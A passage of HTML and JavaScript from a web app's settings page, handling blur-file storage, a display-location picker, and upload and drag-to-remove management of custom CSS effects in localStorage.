                    statusContainer.className = 'status-container';
                    document.querySelector('.blur-section').appendChild(statusContainer);
                }
                
                // Clear previous messages
                statusContainer.innerHTML = '';
                statusContainer.appendChild(statusEl);
                
                // Auto-hide after 3 seconds
                setTimeout(() => {
                    statusEl.style.opacity = '0';
                    setTimeout(() => {
                        statusContainer.removeChild(statusEl);
                    }, 300);
                }, 3000);
            }
            
            // Clear all blur files
            clearBlurBtn.addEventListener('click', function() {
                if (confirm('Are you sure you want to clear all blur files?')) {
                    localStorage.removeItem(blurStorageKey);
                    renderBlurFiles();
                    showStatusMessage('success', 'All blur files cleared');
                }
            });
            
            // Location picker variables and functions
            let selectedLocationX = 50;
            let selectedLocationY = 50;
            let locationSelected = false;
            const locationPickerModal = document.getElementById('locationPickerModal');
            const locationPreview = document.getElementById('locationPreview');
            const locationMarker = document.getElementById('locationMarker');
            const locationX = document.getElementById('locationX');
            const locationY = document.getElementById('locationY');
            const resetPositionBtn = document.getElementById('resetPositionBtn');
            const saveLocationBtn = document.getElementById('saveLocationBtn');
            const setLocationBtn = document.getElementById('setLocationBtn');
            const resetLocBtn = document.getElementById('resetLocationBtn');
            const closeModal = locationPickerModal.querySelector('.close-modal');
            
            // Reset location to center
            function resetLocation() {
                selectedLocationX = 50;
                selectedLocationY = 50;
                locationMarker.style.left = '50%';
                locationMarker.style.top = '50%';
                locationMarker.style.display = 'block';
                locationX.textContent = selectedLocationX;
                locationY.textContent = selectedLocationY;
                locationSelected = true;
            }
            
            // Save the selected location
            function saveLocation() {
                if (locationSelected) {
                    localStorage.setItem('eden_blur_location_x', selectedLocationX);
                    localStorage.setItem('eden_blur_location_y', selectedLocationY);
                    showStatusMessage('success', `Default display location set to X: ${selectedLocationX}%, Y: ${selectedLocationY}%`);
                    locationPickerModal.style.display = 'none';
                } else {
                    showStatusMessage('warning', 'Please select a location first');
                }
            }
            
            // Initialize location picker
            resetLocation();
            
            // Click to set marker position
            locationPreview.addEventListener('click', (e) => {
                const rect = locationPreview.getBoundingClientRect();
                const x = e.clientX - rect.left;
                const y = e.clientY - rect.top;
                
                selectedLocationX = Math.round((x / rect.width) * 100);
                selectedLocationY = Math.round((y / rect.height) * 100);
                
                // Constrain coordinates to be between 10% and 90%
                selectedLocationX = Math.min(Math.max(selectedLocationX, 10), 90);
                selectedLocationY = Math.min(Math.max(selectedLocationY, 10), 90);
                
                locationMarker.style.left = `${selectedLocationX}%`;
                locationMarker.style.top = `${selectedLocationY}%`;
                locationMarker.style.display = 'block';
                
                locationX.textContent = selectedLocationX;
                locationY.textContent = selectedLocationY;
                
                locationSelected = true;
            });
            
            // Reset position button
            resetPositionBtn.addEventListener('click', () => {
                resetLocation();
            });
            
            // Save location button
            saveLocationBtn.addEventListener('click', () => {
                saveLocation();
            });
            
            // Close modal when clicking the X
            closeModal.addEventListener('click', () => {
                locationPickerModal.style.display = 'none';
            });
            
            // Close modal when clicking outside
            window.addEventListener('click', (e) => {
                if (e.target === locationPickerModal) {
                    locationPickerModal.style.display = 'none';
                }
            });
            
            // Set location button opens the modal
            setLocationBtn.addEventListener('click', function() {
                console.log('Set Location button clicked');
                locationPickerModal.style.display = 'block';
            });
            
            // Reset location button resets to default center position
            resetLocBtn.addEventListener('click', function() {
                console.log('Reset Location button clicked');
                resetLocationToDefault();
            });
            
            // Set up blur intensity slider
            blurIntensity.addEventListener('input', function() {
                blurIntensityValue.textContent = this.value;
            });
            
            // Set up download intensity slider
            const downloadIntensity = document.getElementById('downloadIntensity');
            const downloadIntensityValue = document.getElementById('downloadIntensityValue');
            if (downloadIntensity && downloadIntensityValue) {
                downloadIntensity.addEventListener('input', function() {
                    downloadIntensityValue.textContent = this.value;
                });
            }
            
            // Add event listeners for remove custom effects buttons
            const removeCustomEffectsBtn = document.getElementById('removeCustomEffectsBtn');
            if (removeCustomEffectsBtn) {
                removeCustomEffectsBtn.addEventListener('click', function() {
                    removeAllCustomEffects('blur');
                });
            }
            
            const downloadRemoveCustomEffectsBtn = document.getElementById('downloadRemoveCustomEffectsBtn');
            if (downloadRemoveCustomEffectsBtn) {
                downloadRemoveCustomEffectsBtn.addEventListener('click', function() {
                    removeAllCustomEffects('download');
                });
            }
            
            // Function to remove all custom effects
            function removeAllCustomEffects(section) {
                const dropdown = section === 'blur' ? 
                    document.getElementById('blurEffectType') : 
                    document.getElementById('download-effect-selector');
                
                if (!dropdown) return;
                
                // Collect all custom effects
                const customEffects = [];
                for (let i = 0; i < dropdown.options.length; i++) {
                    if (dropdown.options[i].dataset.custom === 'true') {
                        customEffects.push(dropdown.options[i].value);
                    }
                }
                
                // Remove each custom effect
                customEffects.forEach(name => {
                    removeCustomEffect(name);
                });
                
                // Show success message
                if (customEffects.length > 0) {
                    if (section === 'blur') {
                        showStatusMessage('success', `Removed ${customEffects.length} custom effect(s)`);
                    } else {
                        showDownloadStatusMessage('success', `Removed ${customEffects.length} custom effect(s)`);
                    }
                } else {
                    if (section === 'blur') {
                        showStatusMessage('info', 'No custom effects to remove');
                    } else {
                        showDownloadStatusMessage('info', 'No custom effects to remove');
                    }
                }
            }
            
            // File upload handling
            blurUploadArea.addEventListener('click', function() {
                blurFileInput.click();
            });
            
            blurFileInput.addEventListener('change', function(e) {
                handleBlurFiles(e.target.files);
                this.value = ''; // Reset to allow selecting the same file again
            });
            
            // Drag and drop handling
            blurUploadArea.addEventListener('dragover', function(e) {
                e.preventDefault();
                this.classList.add('dragover');
            });
            
            blurUploadArea.addEventListener('dragleave', function() {
                this.classList.remove('dragover');
            });
            
            blurUploadArea.addEventListener('drop', function(e) {
                e.preventDefault();
                this.classList.remove('dragover');
                handleBlurFiles(e.dataTransfer.files);
            });
            
            // Handle file uploads
            function handleBlurFiles(files) {
                if (!files || files.length === 0) return;
                
                for (const file of files) {
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        addBlurFile(file.name, e.target.result);
                        showStatusMessage('success', `File "${file.name}" uploaded`);
                    };
                    reader.onerror = function() {
                        showStatusMessage('error', `Error reading file "${file.name}"`);
                    };
                    reader.readAsText(file);
                }
            }
            
            // Initialize blur section
            renderBlurFiles();
            
            // Custom Effect Upload Handling
            const effectUploadModal = document.getElementById('effectUploadModal');
            const uploadEffectBtn = document.getElementById('uploadEffectBtn');
            const downloadUploadEffectBtn = document.getElementById('downloadUploadEffectBtn');
            const closeEffectModal = document.getElementById('closeEffectModal');
            const cancelEffectBtn = document.getElementById('cancelEffectBtn');
            const saveEffectBtn = document.getElementById('saveEffectBtn');
            const effectFile = document.getElementById('effectFile');
            const effectName = document.getElementById('effectName');
            
            // Show modal when upload buttons are clicked
            uploadEffectBtn.addEventListener('click', function() {
                effectUploadModal.style.display = 'block';
            });
            
            // Add listener for download section upload effect button
            downloadUploadEffectBtn.addEventListener('click', function() {
                effectUploadModal.style.display = 'block';
            });
            
            // Close modal handlers
            closeEffectModal.addEventListener('click', function() {
                effectUploadModal.style.display = 'none';
            });
            
            cancelEffectBtn.addEventListener('click', function() {
                effectUploadModal.style.display = 'none';
            });
            
            // Handle effect file upload
            saveEffectBtn.addEventListener('click', function() {
                const name = effectName.value.trim();
                if (!name) {
                    showStatusMessage('warning', 'Please enter a name for your effect');
                    return;
                }
                
                if (!effectFile.files.length) {
                    showStatusMessage('warning', 'Please select a file for your effect');
                    return;
                }
                
                const file = effectFile.files[0];
                const fileType = 'css'; // Only accepting CSS files now
                
                const reader = new FileReader();
                reader.onload = function(e) {
                    const content = e.target.result;
                    
                    // Store the custom effect in localStorage
                    saveCustomEffect(name, content, fileType);
                    
                    // Add to dropdown if not exists
                    addEffectToDropdown(name);
                    
                    // Reset form and close modal
                    effectName.value = '';
                    effectFile.value = '';
                    effectUploadModal.style.display = 'none';
                    
                    showStatusMessage('success', `Custom effect "${name}" uploaded successfully`);
                };
                
                reader.onerror = function() {
                    showStatusMessage('error', `Error reading file "${file.name}"`);
                };
                
                reader.readAsText(file);
            });
            
            // Function to save custom effect
            function saveCustomEffect(name, content, type) {
                const effectsKey = 'eden-custom-effects';
                let effects = {};
                
                try {
                    const saved = localStorage.getItem(effectsKey);
                    if (saved) effects = JSON.parse(saved);
                } catch (error) {
                    console.error('Error loading custom effects:', error);
                }
                
                effects[name] = {
                    content: content,
                    type: type
                };
                
                localStorage.setItem(effectsKey, JSON.stringify(effects));
            }
            
            // Function to add effect to dropdown
            function addEffectToDropdown(name) {
                // Add to blur section dropdown
                const blurDropdown = document.getElementById('blurEffectType');
                
                // Check if already exists in blur dropdown
                let existsInBlur = false;
                for (let i = 0; i < blurDropdown.options.length; i++) {
                    if (blurDropdown.options[i].value === name) {
                        // Already exists, just select it
                        blurDropdown.value = name;
                        existsInBlur = true;
                        break;
                    }
                }
                
                // Add to blur dropdown if not exists
                if (!existsInBlur) {
                    const blurOption = document.createElement('option');
                    blurOption.value = name;
                    blurOption.textContent = name + ' (Custom)';
                    blurOption.dataset.custom = 'true'; // Mark as custom effect
                    blurDropdown.appendChild(blurOption);
                    
                    // Make custom options draggable for removal
                    setupDraggableOption(blurOption);
                    
                    // Select the new option in blur dropdown
                    blurDropdown.value = name;
                }
                
                // Add to download section dropdown
                const downloadDropdown = document.getElementById('download-effect-selector');
                if (downloadDropdown) {
                    // Check if already exists in download dropdown
                    let existsInDownload = false;
                    for (let i = 0; i < downloadDropdown.options.length; i++) {
                        if (downloadDropdown.options[i].value === name) {
                            existsInDownload = true;
                            break;
                        }
                    }
                    
                    // Add to download dropdown if not exists
                    if (!existsInDownload) {
                        const downloadOption = document.createElement('option');
                        downloadOption.value = name;
                        downloadOption.textContent = name + ' (Custom)';
                        downloadOption.dataset.custom = 'true'; // Mark as custom effect
                        downloadDropdown.appendChild(downloadOption);
                        
                        // Make download options draggable for removal too
                        setupDraggableOption(downloadOption);
                    }
                }
            }
            
            // Setup draggable functionality for custom effects
            function setupDraggableOption(option) {
                option.draggable = true;
                option.title = "Drag outside the dropdown to remove this custom effect";
                
                // Add a visual indicator that this is draggable
                option.style.cursor = 'grab';
                
                option.addEventListener('dragstart', function(e) {
                    e.dataTransfer.setData('text/plain', option.value);
                    
                    // Store the source dropdown ID
                    const parentDropdown = option.parentElement;
                    e.dataTransfer.setData('source-dropdown', parentDropdown.id);
                    
                    // Create a visual indicator for dragging
                    const dragFeedback = document.createElement('div');
                    dragFeedback.textContent = 'Drop outside to remove "' + option.value + '"';
                    dragFeedback.className = 'drag-feedback';
                    document.body.appendChild(dragFeedback);
                    
                    // Create a trash zone indicator
                    const trashZone = document.createElement('div');
                    trashZone.className = 'trash-zone';
                    trashZone.innerHTML = '<i class="fas fa-trash-alt"></i> Drop here to remove';
                    document.body.appendChild(trashZone);
                    
                    // Position the feedback near cursor
                    document.addEventListener('dragover', updateDragFeedback);
                    
                    function updateDragFeedback(e) {
                        dragFeedback.style.left = (e.clientX + 15) + 'px';
                        dragFeedback.style.top = (e.clientY + 15) + 'px';
                        
                        // Check if we're outside the dropdown
                        const dropdown = document.getElementById(parentDropdown.id);
                        const rect = dropdown.getBoundingClientRect();
                        
                        if (e.clientX < rect.left || e.clientX > rect.right || 
                            e.clientY < rect.top || e.clientY > rect.bottom) {
                            // Outside dropdown - show trash zone
                            trashZone.style.display = 'flex';
                            trashZone.style.left = (window.innerWidth / 2 - 100) + 'px';
                            trashZone.style.top = (window.innerHeight - 100) + 'px';
                            
                            // Highlight the trash zone
                            trashZone.classList.add('active');
                        } else {
                            // Inside dropdown - hide trash zone
                            trashZone.style.display = 'none';
                            trashZone.classList.remove('active');
                        }
                    }
                    
                    // Store reference for cleanup
                    e.dataTransfer.dragFeedback = dragFeedback;
                    e.dataTransfer.trashZone = trashZone;
                    e.dataTransfer.updateDragFeedback = updateDragFeedback;
                });
                
                option.addEventListener('dragend', function(e) {
                    // Remove the feedback elements
                    if (e.dataTransfer.dragFeedback) {
                        document.body.removeChild(e.dataTransfer.dragFeedback);
                    }
                    
                    if (e.dataTransfer.trashZone) {
                        document.body.removeChild(e.dataTransfer.trashZone);
                    }
                    
                    document.removeEventListener('dragover', e.dataTransfer.updateDragFeedback);
                    
                    // Determine which dropdown to check based on where the option is from
                    const sourceDropdownId = e.dataTransfer.getData('source-dropdown') || option.parentElement.id;
                    const dropdown = document.getElementById(sourceDropdownId);
                    
                    if (!dropdown) {
                        console.error('Source dropdown not found:', sourceDropdownId);
                        return;
                    }
                    
                    const rect = dropdown.getBoundingClientRect();
                    
                    if (e.clientX < rect.left || e.clientX > rect.right || 
                        e.clientY < rect.top || e.clientY > rect.bottom) {
                        // Dropped outside - remove the effect
                        removeCustomEffect(option.value);
                    }
                });
            }
            
            // Function to remove a custom effect
            function removeCustomEffect(name) {
                // Remove from blur section dropdown
                const blurDropdown = document.getElementById('blurEffectType');
                if (blurDropdown) {
                    for (let i = 0; i < blurDropdown.options.length; i++) {
                        if (blurDropdown.options[i].value === name) {
                            blurDropdown.remove(i);
                            break;
                        }
                    }
                    // Select a default effect for blur dropdown
                    blurDropdown.value = 'blur';
                }
                
                // Remove from download section dropdown
                const downloadDropdown = document.getElementById('download-effect-selector');
                if (downloadDropdown) {
                    for (let i = 0; i < downloadDropdown.options.length; i++) {
                        if (downloadDropdown.options[i].value === name) {
                            downloadDropdown.remove(i);
                            break;
                        }
                    }
                    // Select a default effect for download dropdown
                    downloadDropdown.value = 'blur';
                }
                
                // Remove from localStorage
                const effectsKey = 'eden-custom-effects';
                let effects = {};
                
                try {
                    const saved = localStorage.getItem(effectsKey);
                    if (saved) effects = JSON.parse(saved);
                    
                    if (effects[name]) {
                        delete effects[name];
                        localStorage.setItem(effectsKey, JSON.stringify(effects));
                        showStatusMessage('success', `Custom effect "${name}" removed from all selectors`);
                    }
                } catch (error) {
                    console.error('Error removing custom effect:', error);
                }
            }
            
            // Load existing custom effects on page load
            function loadCustomEffects() {
                const effectsKey = 'eden-custom-effects';
                let effects = {};
                
                try {
                    const saved = localStorage.getItem(effectsKey);
                    if (saved) effects = JSON.parse(saved);
                    
                    // Save to sessionStorage to persist across page refreshes
                    sessionStorage.setItem(effectsKey, saved);
                    
                    console.log('Loading custom effects:', Object.keys(effects).join(', '));
                } catch (error) {
                    console.error('Error loading custom effects:', error);
                    return;
                }
                
                // Add each effect to dropdowns
                Object.keys(effects).forEach(name => {
                    addEffectToDropdown(name);
                    console.log('Added custom effect to dropdowns:', name);
                });
                
                // Make sure all custom options in both dropdowns are draggable
                const blurDropdown = document.getElementById('blurEffectType');
                if (blurDropdown) {
                    for (let i = 0; i < blurDropdown.options.length; i++) {
                        if (blurDropdown.options[i].dataset.custom === 'true') {
                            setupDraggableOption(blurDropdown.options[i]);
                            console.log('Made blur option draggable:', blurDropdown.options[i].value);
                        }
                    }
                }
                
                const downloadDropdown = document.getElementById('download-effect-selector');
                if (downloadDropdown) {
                    for (let i = 0; i < downloadDropdown.options.length; i++) {
                        if (downloadDropdown.options[i].dataset.custom === 'true') {
                            setupDraggableOption(downloadDropdown.options[i]);
                            console.log('Made download option draggable:', downloadDropdown.options[i].value);
                        }
                    }
                }
                
                // Check if we should select a custom effect based on stored settings
                const storedDownloadEffect = localStorage.getItem('eden-download-effect-type');
                const storedCustomEffect = localStorage.getItem('eden-download-custom-effect');
                
                if (storedDownloadEffect === 'custom' && storedCustomEffect && downloadDropdown) {
                    try {
                        const customEffectData = JSON.parse(storedCustomEffect);
                        const effectName = customEffectData.name;
                        
                        // Find and select this option in the download dropdown
                        for (let i = 0; i < downloadDropdown.options.length; i++) {
                            if (downloadDropdown.options[i].value === effectName) {
                                downloadDropdown.selectedIndex = i;
                                console.log('Selected custom effect in download dropdown:', effectName);
                                break;
                            }
                        }
                    } catch (error) {
                        console.error('Error selecting stored custom effect:', error);
                    }
                }
            }
            
            // Function to check sessionStorage for custom effects on page load
            function checkSessionStorageForEffects() {
                const effectsKey = 'eden-custom-effects';
                
                try {
                    // First check localStorage (primary storage)
                    let saved = localStorage.getItem(effectsKey);
                    
                    // If not in localStorage but in sessionStorage, restore from sessionStorage
                    if (!saved && sessionStorage.getItem(effectsKey)) {
                        saved = sessionStorage.getItem(effectsKey);
                        localStorage.setItem(effectsKey, saved);
                        console.log('Restored custom effects from session storage');
                    }
                } catch (error) {
                    console.error('Error checking session storage for effects:', error);
                }
            }
            
            // Check session storage and load custom effects on startup
            checkSessionStorageForEffects();
            loadCustomEffects();
        }
        
        
    </script>
    
    <!-- Location Picker Modal -->
    <div id="locationPickerModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Set Default Display Location</h2>
                <span class="close-modal">&times;</span>
            </div>
            <div class="modal-body">
                <p>Click on the preview area to set the blur display location.</p>
                <div id="locationPreview" class="location-preview">
                    <div id="locationMarker" class="location-marker"></div>
                </div>
                <div class="location-coordinates">
                    <span>X: <span id="locationX">50</span>%</span>
                    <span>Y: <span id="locationY">50</span>%</span>
                </div>
                <div class="modal-actions">
                    <button id="resetPositionBtn" class="btn secondary">Reset Position</button>
                    <button id="saveLocationBtn" class="btn primary">Save Location</button>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Effect Upload Modal -->
    <div id="effectUploadModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Upload Custom Effect</h2>
                <span class="close-modal" id="closeEffectModal">&times;</span>
            </div>
            <div class="modal-body">
                <p>Upload CSS file to create a custom visual effect.</p>
                
                <div class="form-group">
                    <label>Effect Name</label>
                    <input type="text" id="effectName" class="form-control" placeholder="Enter a name for your effect">
                </div>
                
                <div class="form-group">
                    <label>Effect File (CSS only)</label>
                    <input type="file" id="effectFile" accept=".css">
                </div>
            </div>
            <div class="modal-footer">
                <button id="saveEffectBtn" class="btn primary">
                    <i class="fas fa-save"></i> Save Effect
                </button>
                <button id="cancelEffectBtn" class="btn secondary">
                    <i class="fas fa-times"></i> Cancel
                </button>
            </div>
        </div>
    </div>
</body>
</html>
